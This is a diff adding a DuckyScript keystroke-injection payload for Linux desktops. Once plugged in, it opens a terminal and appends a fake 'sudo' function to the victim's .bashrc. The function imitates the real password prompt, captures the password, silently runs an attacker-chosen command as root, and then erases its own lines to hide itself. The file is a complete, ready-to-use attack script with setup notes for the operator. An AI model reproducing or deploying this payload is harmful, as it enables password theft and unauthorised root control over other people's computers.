@@ -1,0 +1,44 @@
+REM ###############################################
+REM #                                             |
+REM # Title        : Run command as root          |
+REM # Author       : simen64                      |
+REM # Version      : 1.0                          |
+REM # Category     : Execution                    |
+REM # Target       : Linux                        |
+REM #                                             |
+REM ###############################################
+
+REM change to your keyboard layout
+DUCKY_LANG NO
+
+DELAY 2000
+CAPSLOCK_DISABLE
+
+REM put your command here (switch out apt update)
+DEFINE #cmd apt update -y
+
+REM_BLOCK
+Use this if your targets DE is Gnome (remove REM_BLOCK and END_REM + this line)
+ALT F2
+DELAY 100
+STRINGLN xterm
+DELAY 500
+END_REM
+
+REM_BLOCK
+Use this if your targets DE or WM has the ctrl-alt-t shortcut (remove REM_BLOCK and END_REM + this line)
+CTRL-ALT t
+DELAY 500
+END_REM
+
+REM inject the code
+STRINGLN_BLOCK
+ echo '
+sudo() {
+while true; do
+    read -s -r -p "[sudo] password for ${USER}: " passwd
+    echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo "${passwd}" | /usr/bin/sudo -S #cmd; head -n -6 .bashrc > temp && mv temp .bashrc; break; } >/dev/null 2>&1 || { clear; echo "Sorry, try again."; }
+done
+}' >> .bashrc
+exit
+END_STRINGLN
